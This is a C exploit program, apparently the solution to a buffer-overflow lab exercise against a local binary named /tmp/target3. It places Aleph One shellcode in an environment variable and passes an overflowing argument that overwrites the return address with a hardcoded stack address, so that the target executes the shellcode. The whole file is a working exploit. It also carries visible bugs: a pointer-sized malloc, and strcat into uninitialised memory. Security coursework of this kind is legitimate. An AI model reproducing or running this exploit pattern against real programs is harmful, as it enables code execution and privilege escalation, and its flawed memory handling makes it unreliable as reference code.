#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  char *preface = "shellcode=";
  char *envvar = malloc(sizeof(preface)+sizeof(shellcodeAlephOne)+16);
  strcat(envvar, preface);
  strcat(envvar, "AAAA");
  strcat(envvar, "\x97\xff\xff\xbf");
  strcat(envvar, shellcodeAlephOne);

  args[0] = TARGET;
  args[1] = "AAAAAAAAAAAAAAAA\x8f\xff\xff\xbf";
  args[2] = NULL;
  
  env[0] = envvar;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


